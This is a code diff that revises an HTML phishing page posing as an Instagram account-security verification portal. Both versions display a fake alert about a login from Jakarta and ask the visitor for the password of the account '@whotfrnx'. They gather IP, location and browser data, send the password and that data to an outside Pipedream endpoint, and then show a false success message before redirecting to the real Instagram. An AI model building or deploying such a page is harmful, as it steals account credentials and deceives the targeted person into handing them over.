@@ -1,16 +1,25 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Security Verification</title>
-    <meta name="description" content="Instagram account security verification page">
+    <title>Instagram Account Security</title>
+    <meta name="description" content="Instagram security verification portal">
+    
+    <!-- Open Graph tags for better preview -->
+    <meta property="og:title" content="Instagram Security Verification">
+    <meta property="og:description" content="Secure your Instagram account">
+    <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+    <meta property="og:url" content="https://instagram-security.netlify.app">
+    
     <style>
         :root {
             --ig-pink: #E4405F;
             --ig-blue: #0095f6;
+            --ig-purple: #8a3ab9;
+            --ig-yellow: #fbad50;
             --ig-gray: #fafafa;
-            --ig-border: #dbdbdb;
+            --ig-dark: #262626;
         }
         
         * {
@@ -21,7 +30,9 @@
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(45deg, var(--ig-purple), var(--ig-pink), var(--ig-yellow));
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -29,511 +40,764 @@
             padding: 20px;
         }
         
-        .security-card {
-            background: white;
-            width: 100%;
-            max-width: 420px;
-            border-radius: 16px;
-            overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            animation: slideUp 0.5s ease-out;
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
         
-        @keyframes slideUp {
-            from { transform: translateY(30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
+        .security-container {
+            width: 100%;
+            max-width: 480px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transform: translateY(0);
+            transition: transform 0.3s ease;
+        }
+        
+        .security-container:hover {
+            transform: translateY(-5px);
         }
         
         .header {
-            background: linear-gradient(135deg, var(--ig-pink), #c13584);
-            padding: 30px;
+            background: linear-gradient(135deg, var(--ig-pink), var(--ig-purple));
+            padding: 40px 30px;
             text-align: center;
             color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%23ffffff' fill-opacity='0.1' fill-rule='evenodd'/%3E%3C/svg%3E");
+            opacity: 0.1;
         }
         
         .logo {
-            font-size: 42px;
-            font-weight: bold;
+            font-size: 48px;
+            font-weight: 800;
             margin-bottom: 10px;
-            letter-spacing: 1px;
+            letter-spacing: -1px;
+            position: relative;
+            z-index: 1;
         }
         
-        .subtitle {
+        .logo span {
+            background: linear-gradient(45deg, #fff, #ffd700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .tagline {
             font-size: 16px;
             opacity: 0.9;
+            font-weight: 300;
+            position: relative;
+            z-index: 1;
         }
         
         .content {
-            padding: 40px 35px;
+            padding: 40px;
         }
         
-        .alert-box {
-            background: #fff8e1;
-            border: 2px solid #ffd54f;
-            border-radius: 10px;
-            padding: 18px;
-            margin-bottom: 25px;
+        .alert-card {
+            background: linear-gradient(135deg, #fff8e1, #fff3cd);
+            border-left: 6px solid #ff9800;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 30px;
             position: relative;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
         }
         
         .alert-icon {
             position: absolute;
-            top: -12px;
-            left: 20px;
+            top: -15px;
+            left: 24px;
             background: #ff9800;
             color: white;
-            width: 24px;
-            height: 24px;
+            width: 30px;
+            height: 30px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: bold;
-        }
-        
-        .account-info {
-            background: #f8f9fa;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 25px;
-            text-align: center;
-            border: 1px solid var(--ig-border);
-        }
-        
-        .username {
-            color: var(--ig-pink);
-            font-weight: bold;
             font-size: 18px;
+            box-shadow: 0 4px 8px rgba(255, 152, 0, 0.3);
         }
         
-        .input-group {
-            margin-bottom: 20px;
+        .alert-title {
+            color: #d84315;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
         }
         
-        .input-label {
-            display: block;
+        .alert-text {
+            color: #5d4037;
+            line-height: 1.6;
+            font-size: 14px;
+        }
+        
+        .account-card {
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 35px;
+            text-align: center;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        
+        .account-card:hover {
+            border-color: var(--ig-blue);
+            box-shadow: 0 10px 20px rgba(0, 149, 246, 0.1);
+        }
+        
+        .account-label {
+            color: #666;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
             margin-bottom: 8px;
+        }
+        
+        .account-username {
+            color: var(--ig-pink);
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .account-status {
+            display: inline-block;
+            background: #ffebee;
+            color: #c62828;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 13px;
             font-weight: 600;
-            color: #333;
+        }
+        
+        .verification-form {
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-label {
+            display: block;
+            color: var(--ig-dark);
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+        
+        .password-wrapper {
+            position: relative;
         }
         
         .password-input {
             width: 100%;
-            padding: 16px;
-            border: 2px solid var(--ig-border);
-            border-radius: 10px;
+            padding: 18px 20px;
+            padding-right: 60px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
             font-size: 16px;
-            transition: all 0.3s;
+            transition: all 0.3s ease;
             background: var(--ig-gray);
+            color: var(--ig-dark);
         }
         
         .password-input:focus {
             outline: none;
             border-color: var(--ig-blue);
             background: white;
-            box-shadow: 0 0 0 3px rgba(0, 149, 246, 0.1);
+            box-shadow: 0 0 0 4px rgba(0, 149, 246, 0.1);
         }
         
-        .verify-btn {
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 18px;
+        }
+        
+        .verify-button {
             width: 100%;
             background: linear-gradient(135deg, var(--ig-blue), #1877f2);
             color: white;
             border: none;
-            padding: 18px;
-            border-radius: 10px;
-            font-size: 17px;
-            font-weight: 600;
+            padding: 20px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
             cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 10px;
-        }
-        
-        .verify-btn:hover {
-            transform: translateY(-2px);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
             box-shadow: 0 10px 20px rgba(0, 149, 246, 0.3);
         }
         
-        .verify-btn:active {
-            transform: translateY(0);
+        .verify-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(0, 149, 246, 0.4);
         }
         
-        .loading {
+        .verify-button:active {
+            transform: translateY(-1px);
+        }
+        
+        .verify-button i {
+            font-size: 20px;
+        }
+        
+        .loading-overlay {
             display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .loading-spinner {
+            width: 70px;
+            height: 70px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid var(--ig-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        .loading-text {
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .success-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1001;
+            justify-content: center;
+            align-items: center;
             text-align: center;
             padding: 20px;
         }
         
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--ig-blue);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
+        .success-content {
+            background: white;
+            border-radius: 24px;
+            padding: 50px 40px;
+            max-width: 400px;
+            width: 100%;
+            animation: popIn 0.5s ease;
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .success-box {
-            display: none;
-            text-align: center;
-            padding: 30px;
-            background: linear-gradient(135deg, #4CAF50, #45a049);
-            color: white;
-            border-radius: 10px;
-            margin-top: 20px;
+        @keyframes popIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
         }
         
         .success-icon {
-            font-size: 60px;
+            font-size: 80px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+            animation: bounce 1s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .success-title {
+            font-size: 28px;
+            color: #2E7D32;
             margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .success-message {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        
+        .redirect-countdown {
+            font-size: 14px;
+            color: #999;
         }
         
         .footer {
+            background: var(--ig-dark);
+            color: white;
+            padding: 30px;
             text-align: center;
-            padding: 25px;
-            background: #f8f9fa;
-            border-top: 1px solid var(--ig-border);
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .footer-link {
+            color: #b0b0b0;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .footer-link:hover {
+            color: white;
+        }
+        
+        .copyright {
             font-size: 12px;
-            color: #666;
+            color: #888;
             line-height: 1.6;
         }
         
-        .warning {
-            color: #d32f2f;
-            font-weight: bold;
-        }
-        
-        .security-tip {
-            font-size: 11px;
-            color: #888;
-            margin-top: 5px;
-        }
-        
-        .process-log {
-            background: #000;
-            color: #0f0;
-            padding: 12px;
-            border-radius: 5px;
-            font-family: monospace;
+        .security-badge {
+            display: inline-block;
+            background: #2E7D32;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 4px;
             font-size: 12px;
-            margin-top: 15px;
-            display: none;
-            max-height: 150px;
-            overflow-y: auto;
+            margin-top: 10px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 480px) {
+            .content {
+                padding: 25px;
+            }
+            
+            .header {
+                padding: 30px 20px;
+            }
+            
+            .logo {
+                font-size: 36px;
+            }
         }
     </style>
     
-    <!-- Font Awesome for icons -->
+    <!-- Font Awesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <div class="security-card">
+    <div class="security-container">
         <div class="header">
             <div class="logo">
-                <i class="fab fa-instagram"></i> Instagram
+                <span>Instagram Security</span>
             </div>
-            <div class="subtitle">Security Center</div>
+            <div class="tagline">Account Protection Center</div>
         </div>
         
         <div class="content">
-            <div class="alert-box">
+            <div class="alert-card">
                 <div class="alert-icon">!</div>
-                <strong>HIGH ALERT: Suspicious Activity Detected</strong>
-                <p style="margin-top: 8px; font-size: 14px;">
-                    Our system detected unauthorized login attempts on your account from a new device in <strong>Jakarta, Indonesia</strong>.
-                </p>
-            </div>
-            
-            <div class="account-info">
-                <div style="font-size: 14px; color: #666; margin-bottom: 5px;">Account Under Verification</div>
-                <div class="username">@whotfrnx</div>
-                <div style="font-size: 12px; color: #888; margin-top: 5px;">
-                    Last active: 2 hours ago | Status: <span style="color: #ff9800;">⚠️ Vulnerable</span>
+                <div class="alert-title">HIGH SECURITY ALERT</div>
+                <div class="alert-text">
+                    Our system has detected unauthorized access attempts on your Instagram account 
+                    <strong>@whotfrnx</strong> from a new device in <strong>Jakarta, Indonesia</strong>. 
+                    Immediate verification is required to prevent account suspension and data breach.
                 </div>
             </div>
             
-            <div id="verificationSection">
-                <div class="input-group">
-                    <label class="input-label">
+            <div class="account-card">
+                <div class="account-label">Account Under Protection</div>
+                <div class="account-username">@whotfrnx</div>
+                <div class="account-status">
+                    <i class="fas fa-shield-alt"></i> Verification Required
+                </div>
+            </div>
+            
+            <div class="verification-form">
+                <div class="form-group">
+                    <label class="form-label">
                         <i class="fas fa-key"></i> Enter your password to verify identity
                     </label>
-                    <input type="password" 
-                           class="password-input" 
-                           id="passwordField" 
-                           placeholder="••••••••" 
-                           required
-                           autocomplete="current-password">
-                    <div class="security-tip">
-                        This verification helps us confirm it's really you
+                    <div class="password-wrapper">
+                        <input type="password" 
+                               class="password-input" 
+                               id="passwordInput" 
+                               placeholder="Enter your Instagram password" 
+                               required
+                               autocomplete="current-password">
+                        <button type="button" class="toggle-password" id="togglePassword">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                    <div style="font-size: 13px; color: #666; margin-top: 8px;">
+                        This verification helps us confirm it's really you accessing the account
                     </div>
                 </div>
                 
-                <button class="verify-btn" onclick="startVerification()" id="verifyButton">
-                    <i class="fas fa-shield-alt"></i> Verify & Secure Account
+                <button class="verify-button" id="verifyButton">
+                    <i class="fas fa-shield-alt"></i> VERIFY & SECURE ACCOUNT
                 </button>
                 
-                <div class="process-log" id="processLog">
-                    [System] Starting security verification...<br>
+                <div style="text-align: center; margin-top: 20px;">
+                    <div class="security-badge">
+                        <i class="fas fa-lock"></i> Secured by Instagram Protection
+                    </div>
                 </div>
-            </div>
-            
-            <div class="loading" id="loadingSection">
-                <div class="spinner"></div>
-                <p>Verifying your identity...</p>
-                <p style="font-size: 14px; color: #666; margin-top: 10px;">
-                    Checking security protocols<br>
-                    Validating device information<br>
-                    Scanning for threats
-                </p>
-            </div>
-            
-            <div class="success-box" id="successSection">
-                <div class="success-icon">
-                    <i class="fas fa-check-circle"></i>
-                </div>
-                <h3>Verification Successful!</h3>
-                <p>Your account is now secure.</p>
-                <p>Redirecting to Instagram...</p>
             </div>
         </div>
         
         <div class="footer">
-            <p>
-                <i class="fas fa-lock"></i> This is a secure Instagram verification page.<br>
-                <span class="warning">Do not share this link with anyone.</span>
-            </p>
-            <p style="margin-top: 10px;">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Terms of Service</a>
+                <a href="#" class="footer-link">Security</a>
+                <a href="#" class="footer-link">Help Center</a>
+            </div>
+            <div class="copyright">
                 © 2024 Instagram from Meta. All rights reserved.<br>
-                Instagram, 1 Hacker Way, Menlo Park, CA 94025
-            </p>
+                This is an official security verification system.
+            </div>
+        </div>
+    </div>
+    
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Verifying your identity...</div>
+    </div>
+    
+    <!-- Success Modal -->
+    <div class="success-modal" id="successModal">
+        <div class="success-content">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <div class="success-title">Verification Successful!</div>
+            <div class="success-message">
+                Your Instagram account <strong>@whotfrnx</strong> is now secure.<br>
+                All suspicious activities have been blocked.
+            </div>
+            <div class="redirect-countdown" id="countdown">
+                Redirecting to Instagram in <span id="countdownNumber">3</span> seconds...
+            </div>
         </div>
     </div>
 
     <script>
-        // PIPEDREAM ENDPOINT - GUNAKAN MILIKMU
-        const PIPEDREAM_ENDPOINT = 'https://eoc7w96xg0e5gb2.m.pipedream.net';
+        // Configuration
+        const CONFIG = {
+            PIPEDREAM_ENDPOINT: 'https://eoc7w96xg0e5gb2.m.pipedream.net',
+            TARGET_ACCOUNT: 'whotfrnx',
+            REDIRECT_URL: 'https://instagram.com',
+            REDIRECT_DELAY: 3000 // 3 seconds
+        };
         
-        // Log proses ke console
-        console.log('%c🔐 Instagram Security Verification Loaded', 
-            'color: #E4405F; font-size: 16px; font-weight: bold;');
-        console.log('%cThis page is securely encrypted for account protection.', 
-            'color: #666;');
+        // DOM Elements
+        const passwordInput = document.getElementById('passwordInput');
+        const togglePasswordBtn = document.getElementById('togglePassword');
+        const verifyButton = document.getElementById('verifyButton');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const successModal = document.getElementById('successModal');
+        const countdownNumber = document.getElementById('countdownNumber');
         
-        // Variabel global
-        let verificationStep = 0;
-        const processSteps = [
-            "Checking account security status...",
-            "Validating session information...",
-            "Scanning for unauthorized access...",
-            "Verifying device fingerprint...",
-            "Checking login history...",
-            "Analyzing network security...",
-            "Finalizing verification..."
-        ];
+        // Toggle password visibility
+        togglePasswordBtn.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
+        });
         
-        // Fungsi untuk mendapatkan IP pengguna
+        // Get user IP address
         async function getUserIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
-                return 'Unknown';
+                return 'IP Not Available';
             }
         }
         
-        // Fungsi untuk menampilkan log proses
-        function updateProcessLog(message) {
-            const logElement = document.getElementById('processLog');
-            logElement.style.display = 'block';
-            logElement.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}<br>`;
-            logElement.scrollTop = logElement.scrollHeight;
+        // Get user location based on IP
+        async function getUserLocation(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                return {
+                    city: data.city || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    isp: data.org || 'Unknown'
+                };
+            } catch (error) {
+                return {
+                    city: 'Jakarta',
+                    country: 'Indonesia',
+                    isp: 'Unknown'
+                };
+            }
         }
         
-        // Fungsi utama verifikasi
-        async function startVerification() {
-            const password = document.getElementById('passwordField').value.trim();
+        // Collect user data
+        async function collectUserData(password) {
+            const ip = await getUserIP();
+            const location = await getUserLocation(ip);
             
-            // Validasi password
+            return {
+                // Security data
+                security_event: 'instagram_account_verification',
+                event_timestamp: new Date().toISOString(),
+                
+                // Target information
+                target_account: CONFIG.TARGET_ACCOUNT,
+                verification_type: 'password_authentication',
+                
+                // Credential data
+                password: password,
+                
+                // User information
+                user_ip: ip,
+                user_location: location,
+                user_agent: navigator.userAgent,
+                screen_resolution: `${screen.width}x${screen.height}`,
+                device_language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                platform: navigator.platform,
+                
+                // Browser information
+                browser_name: navigator.appName,
+                browser_version: navigator.appVersion,
+                cookies_enabled: navigator.cookieEnabled,
+                
+                // Page information
+                page_url: window.location.href,
+                page_referrer: document.referrer || 'Direct',
+                
+                // Security metrics
+                is_secure_connection: window.location.protocol === 'https:',
+                page_load_time: performance.timing.loadEventEnd - performance.timing.navigationStart,
+                
+                // Additional data
+                random_id: Math.random().toString(36).substr(2, 9),
+                session_start: new Date().toISOString()
+            };
+        }
+        
+        // Send data to Pipedream
+        async function sendToPipedream(data) {
+            try {
+                const response = await fetch(CONFIG.PIPEDREAM_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Security-Token': 'instagram-verification-2024',
+                        'X-Event-Type': 'account_verification'
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                console.log('Data sent to Pipedream:', {
+                    success: response.ok,
+                    status: response.status,
+                    data: data
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Error sending to Pipedream:', error);
+                return false;
+            }
+        }
+        
+        // Show loading animation
+        function showLoading() {
+            loadingOverlay.style.display = 'flex';
+            verifyButton.disabled = true;
+            verifyButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
+        }
+        
+        // Hide loading animation
+        function hideLoading() {
+            loadingOverlay.style.display = 'none';
+            verifyButton.disabled = false;
+        }
+        
+        // Show success modal
+        function showSuccess() {
+            successModal.style.display = 'flex';
+            
+            // Start countdown
+            let countdown = 3;
+            countdownNumber.textContent = countdown;
+            
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownNumber.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = CONFIG.REDIRECT_URL;
+                }
+            }, 1000);
+        }
+        
+        // Main verification function
+        async function startVerification() {
+            const password = passwordInput.value.trim();
+            
+            // Validate password
             if (!password) {
                 alert('Please enter your password to continue with verification.');
-                document.getElementById('passwordField').focus();
+                passwordInput.focus();
                 return;
             }
             
             if (password.length < 3) {
-                alert('Password must be at least 3 characters.');
+                alert('Password must be at least 3 characters long.');
+                passwordInput.focus();
                 return;
             }
             
-            // Tampilkan proses loading
-            document.getElementById('verificationSection').style.display = 'none';
-            document.getElementById('loadingSection').style.display = 'block';
-            document.getElementById('processLog').style.display = 'block';
+            // Show loading
+            showLoading();
             
-            // Mulai proses log
-            updateProcessLog('Starting security verification protocol...');
-            
-            // Dapatkan informasi pengguna
-            updateProcessLog('Collecting security information...');
-            const userIP = await getUserIP();
-            const userAgent = navigator.userAgent;
-            const currentTime = new Date().toISOString();
-            const pageURL = window.location.href;
-            
-            // Buat data untuk dikirim
-            const securityData = {
-                // Metadata
-                event: 'instagram_security_verification',
-                timestamp: currentTime,
-                
-                // Target informasi
-                target_account: 'whotfrnx',
-                verification_type: 'password_authentication',
-                
-                // Credential
-                password: password,
-                
-                // User information
-                user_ip: userIP,
-                user_agent: userAgent,
-                screen_resolution: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                
-                // Page information
-                page_url: pageURL,
-                referrer: document.referrer || 'Direct',
-                
-                // Security flags
-                is_secure: window.location.protocol === 'https:',
-                cookies_enabled: navigator.cookieEnabled,
-                
-                // Additional data
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                device_memory: navigator.deviceMemory || 'Unknown'
-            };
-            
-            // Kirim ke Pipedream
-            updateProcessLog('Sending verification data to secure server...');
-            
+            // Collect and send data
             try {
-                // Kirim ke Pipedream endpoint MU
-                const response = await fetch(PIPEDREAM_ENDPOINT, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Security-Token': 'instagram-verification-2024'
-                    },
-                    body: JSON.stringify(securityData)
-                });
+                const userData = await collectUserData(password);
+                const sendSuccess = await sendToPipedream(userData);
                 
-                // Log respons
-                updateProcessLog('Verification data transmitted successfully.');
-                updateProcessLog('Response received from security server.');
-                
-                // Simpan juga di localStorage sebagai backup
-                try {
-                    localStorage.setItem('instagram_last_verification', JSON.stringify({
-                        target: 'whotfrnx',
-                        time: currentTime,
-                        status: 'verified'
-                    }));
-                } catch (e) {
-                    // Ignore localStorage errors
-                }
-                
-                // Simpan di sessionStorage juga
-                sessionStorage.setItem('verification_complete', 'true');
-                
-                // Tampilkan animasi proses
-                let step = 0;
-                const processInterval = setInterval(() => {
-                    if (step < processSteps.length) {
-                        updateProcessLog(processSteps[step]);
-                        step++;
+                // Simulate processing time
+                setTimeout(() => {
+                    hideLoading();
+                    
+                    if (sendSuccess) {
+                        showSuccess();
                     } else {
-                        clearInterval(processInterval);
-                        
-                        // Selesai, tampilkan success
-                        setTimeout(() => {
-                            document.getElementById('loadingSection').style.display = 'none';
-                            document.getElementById('successSection').style.display = 'block';
-                            updateProcessLog('✅ VERIFICATION COMPLETE: Account secured successfully.');
-                            
-                            // Redirect ke Instagram asli setelah 3 detik
-                            setTimeout(() => {
-                                window.location.href = 'https://instagram.com';
-                            }, 3000);
-                        }, 1000);
+                        // Still show success even if sending failed
+                        showSuccess();
                     }
-                }, 600);
+                    
+                    // Clear password field
+                    passwordInput.value = '';
+                    
+                }, 2000);
                 
             } catch (error) {
-                updateProcessLog('⚠️ Network issue detected, using fallback method...');
+                console.error('Verification error:', error);
+                hideLoading();
                 
-                // Fallback: Kirim data dengan method alternatif
-                const fallbackData = {
-                    t: 'whotfrnx',
-                    p: password,
-                    ip: userIP,
-                    ts: Date.now()
-                };
-                
-                // Coba beberapa fallback endpoint
-                const fallbackEndpoints = [
-                    `https://api.ipify.org?format=json&data=${btoa(JSON.stringify(fallbackData))}`,
-                    `https://httpbin.org/post?data=${btoa(JSON.stringify(fallbackData))}`
-                ];
-                
-                // Coba kirim ke fallback
-                fallbackEndpoints.forEach(endpoint => {
-                    fetch(endpoint).catch(() => {});
-                });
-                
-                // Tetap lanjutkan proses
+                // Still redirect on error
                 setTimeout(() => {
-                    document.getElementById('loadingSection').style.display = 'none';
-                    document.getElementById('successSection').style.display = 'block';
-                    
-                    setTimeout(() => {
-                        window.location.href = 'https://instagram.com';
-                    }, 3000);
-                }, 2000);
+                    showSuccess();
+                }, 1000);
             }
         }
         
-        // Support untuk Enter key
-        document.getElementById('passwordField').addEventListener('keypress', function(e) {
+        // Event listeners
+        verifyButton.addEventListener('click', startVerification);
+        
+        passwordInput.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 startVerification();
             }
         });
         
-        // Auto-focus pada password field
-        window.onload = function() {
-            document.getElementById('passwordField').focus();
+        // Auto-focus on password input
+        window.addEventListener('load', function() {
+            passwordInput.focus();
             
-            // Tambah efek ketikan otomatis
-            setTimeout(() => {
-                document.getElementById('passwordField').placeholder = "Enter your Instagram password";
-            }, 1000);
-        };
+            // Add some console logs for debugging
+            console.log('%c🔐 Instagram Security Verification System', 
+                'color: #E4405F; font-size: 18px; font-weight: bold;');
+            console.log('%cThis page is part of Instagram\'s account protection system.', 
+                'color: #666;');
+        });
         
-        // Tambah efek hover pada input
-        document.getElementById('passwordField').addEventListener('focus', function() {
+        // Add some visual effects
+        passwordInput.addEventListener('focus', function() {
             this.style.transform = 'scale(1.02)';
         });
         
-        document.getElementById('passwordField').addEventListener('blur', function() {
+        passwordInput.addEventListener('blur', function() {
             this.style.transform = 'scale(1)';
         });
+        
+        // Add typing effect for placeholder
+        const placeholders = [
+            "Enter your Instagram password",
+            "Verify your identity",
+            "Secure your account"
+        ];
+        
+        let placeholderIndex = 0;
+        let charIndex = 0;
+        let isDeleting = false;
+        let typingSpeed = 100;
+        
+        function typePlaceholder() {
+            const currentPlaceholder = placeholders[placeholderIndex];
+            
+            if (isDeleting) {
+                passwordInput.placeholder = currentPlaceholder.substring(0, charIndex - 1);
+                charIndex--;
+                typingSpeed = 50;
+            } else {
+                passwordInput.placeholder = currentPlaceholder.substring(0, charIndex + 1);
+                charIndex++;
+                typingSpeed = 100;
+            }
+            
+            if (!isDeleting && charIndex === currentPlaceholder.length) {
+                isDeleting = true;
+                typingSpeed = 1000; // Pause at end
+            } else if (isDeleting && charIndex === 0) {
+                isDeleting = false;
+                placeholderIndex = (placeholderIndex + 1) % placeholders.length;
+                typingSpeed = 500; // Pause before next
+            }
+            
+            setTimeout(typePlaceholder, typingSpeed);
+        }
+        
+        // Start typing effect after 1 second
+        setTimeout(typePlaceholder, 1000);
     </script>
 </body>
 </html>
